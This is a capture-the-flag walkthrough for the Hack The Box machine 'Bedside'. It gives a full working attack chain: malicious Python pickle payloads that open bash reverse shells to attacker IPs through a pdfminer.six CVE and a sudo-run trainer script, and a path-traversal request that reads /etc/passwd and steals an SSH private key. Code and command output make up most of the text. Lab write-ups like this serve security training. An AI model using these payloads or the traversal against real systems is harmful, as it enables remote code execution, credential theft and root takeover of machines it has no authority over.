### 🏥 **Bedside HTB - Complete Walkthrough**

---

## 1️⃣ **Reconnaissance**

```bash
nmap -sC -sV -p- 10.129.55.19 -oN scans/scan.txt
```

**Results:**
```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2
80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp
```

---

## 2️⃣ **Initial Foothold (CVE-2025-64512)**

### **Create `shell.pickle.gz`:**
```python
#!/usr/bin/env python3
import pickle, gzip

class Exploit:
    def __reduce__(self):
        cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.254/4444 0>&1"]
        code = "__import__('subprocess').Popen(%r) and {}" % (cmd,)
        return (eval, (code,))

with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Exploit(), f)
print("wrote shell.pickle.gz")
```

### **Upload:**
```bash
curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.pickle.gz" -v
```

### **Listen:**
```bash
nc -lvnp 4444
```

**Result:**
```bash
datawrangler@data-wrangler:/app$
```

---

## 3️⃣ **LFI via Port 3000**

### **Read `/etc/passwd`:**
```bash
curl --path-as-is 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../etc/passwd'
```

### **Get SSH Key:**
```bash
curl --path-as-is 'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa'
```

**Result:**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7D*****************************************************
-----END OPENSSH PRIVATE KEY-----
```

### **Connect via SSH:**
```bash
chmod 600 developer_key
ssh -i developer_key developer@ip
```

**Result:**
```
developer@bedside:~$
```

---

## 4️⃣ **User Flag**

```bash
developer@bedside:~$ ls
projects  user.txt
developer@bedside:~$ cat user.txt
[FLAG]
```

---


## 5️⃣ **Privilege Escalation (Complete)**

### **Check Sudo:**
```bash
developer@bedside:~$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

---

### **Exploit Steps:**

#### **Step 1: Create Malicious Checkpoint (from `datawrangler` shell)**
```bash
python3 -c "
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c \"bash -i >& /dev/tcp/your-ip/4447 0>&1\"',))
payload = {'model': Exploit()}
with open('/datastore/checkpoints/evil.pt', 'wb') as f:
    pickle.dump(payload, f)
print('evil.pt created')
"
```

#### **Step 2: Clean `/datastore/processed/` directory**
```bash
rm -f /datastore/processed/*
```

#### **Step 3: Create valid dummy image**
```bash
echo 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==' | base64 -d > /datastore/processed/dummy.png
```

#### **Step 4: Update timestamp (make it the newest)**
```bash
touch /datastore/checkpoints/evil.pt
```

#### **Step 5: Run the script (from `developer` shell)**
```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

#### **Step 6: Listen for reverse shell (on attacker machine)**
```bash
nc -lvnp 4447
```

**Result:**
```bash
root@bedside:~#
```

---

## 6️⃣ **Root Flag**

```bash
root@bedside:~# cat /root/root.txt
[FLAG]
```

---

## 📝 **Summary Table**

| Step | User | Vulnerability/Technique |
|:---|:---|:---|
| 1 | `datawrangler` | CVE-2025-64512 (PDF pickle deserialization) |
| 2 | `developer` | LFI on Port 3000 → SSH key theft |
| 3 | `root` | Sudo + Python script + Pickle checkpoint RCE |

---

## 🔑 **Lessons Learned**

1. **CVE-2025-64512**: `pdfminer.six` loads pickle files unsafely from PDFs.
2. **LFI on Port 3000**: Exposed file read allows stealing SSH keys.
3. **Weak Sudo Configuration**: Running Python scripts with `NOPASSWD` is dangerous.
4. **Pickle Deserialization**: Loading untrusted `.pt` files leads to RCE.
5. **Permission Management**: `/datastore/` should not be writable by `datawrangler`.

---

**Machine Solved! 🎉**

